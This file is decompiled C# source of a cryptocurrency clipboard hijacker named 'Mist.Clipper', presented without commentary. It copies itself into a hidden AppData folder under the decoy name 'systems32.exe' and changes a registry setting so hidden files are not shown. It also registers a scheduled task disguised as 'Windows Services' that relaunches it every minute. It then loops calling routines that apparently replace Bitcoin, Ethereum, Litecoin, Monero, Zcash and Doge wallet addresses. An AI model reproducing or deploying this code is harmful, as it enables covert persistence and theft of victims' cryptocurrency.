using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Threading;
using Microsoft.Win32;

namespace Mist.Clipper
{
	// Token: 0x02000076 RID: 118
	internal class Clipper
	{
		// Token: 0x060002C4 RID: 708 RVA: 0x00005B48 File Offset: 0x00003D48
		public static void start()
		{
			for (;;)
			{
				Thread.Sleep(100);
				Clipper.replace();
			}
		}

		// Token: 0x060002C5 RID: 709 RVA: 0x00012E68 File Offset: 0x00011068
		public static void CopyFile()
		{
			try
			{
				if (!Directory.Exists(Clipper.dir))
				{
					Directory.CreateDirectory(Clipper.dir);
				}
				if (!File.Exists(Clipper.dir + "\\" + Clipper.file))
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, Clipper.dir + "\\" + Clipper.file);
				}
				File.SetAttributes(Clipper.dir + "\\" + Clipper.file, FileAttributes.Hidden | FileAttributes.System | FileAttributes.Directory);
				File.SetAttributes(Clipper.dir + "\\" + Clipper.file, FileAttributes.Hidden | FileAttributes.System);
			}
			catch
			{
			}
		}

		// Token: 0x060002C6 RID: 710 RVA: 0x00012F14 File Offset: 0x00011114
		public static void autorun()
		{
			try
			{
				Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced").SetValue("Hidden", 0);
				Process.Start(new ProcessStartInfo
				{
					FileName = "schtasks.exe",
					CreateNoWindow = false,
					WindowStyle = ProcessWindowStyle.Hidden,
					Arguments = string.Concat(new string[]
					{
						"/create /sc MINUTE /mo 1 /tn \"Windows Services\" /tr \"",
						Clipper.dir,
						"\\",
						Clipper.file,
						"\" /f"
					})
				});
			}
			catch
			{
			}
		}

		// Token: 0x060002C7 RID: 711 RVA: 0x00012FB4 File Offset: 0x000111B4
		public static void replace()
		{
			try
			{
				Bitcoin.GetBitcoinWhile();
				Etherium.GetEtheriumWhile();
				LiteCoin.GetLiteCoinWhile();
				Monero.GetMoneroWhile();
				zec.GetEtnWhile();
				Doge.GetDogeWhile();
				Thread.Sleep(500);
			}
			catch
			{
			}
		}

		// Token: 0x04000176 RID: 374
		private static string dir = Environment.GetEnvironmentVariable("AppData") + "\\systems32_bit";

		// Token: 0x04000177 RID: 375
		private static string file = "systems32.exe";
	}
}
